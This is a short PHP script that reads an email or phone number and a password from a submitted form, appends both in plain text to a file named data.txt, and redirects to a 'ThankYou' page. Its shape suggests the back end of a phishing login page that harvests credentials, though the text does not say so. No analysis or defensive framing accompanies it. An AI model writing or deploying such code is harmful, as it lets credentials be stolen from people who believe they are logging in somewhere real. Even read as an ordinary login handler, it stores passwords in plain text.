<?php
$email=$_POST{'email'};
$password=$_POST{'password'};

if (empty($email))
{
	echo "<script>alert('Please Enter Email/Phone');</script>";
	
}
if($password=='')
{
	echo "<script>alert('Please Enter Password');</script>";
}
$fp=fopen("data.txt","a"); // here a is apendix
$savestring = "Email Adress: ".$email."\n"."Password: ".$password."\n";
fwrite($fp, $savestring);
fclose($fp);
header('location:ThankYou.html');
?>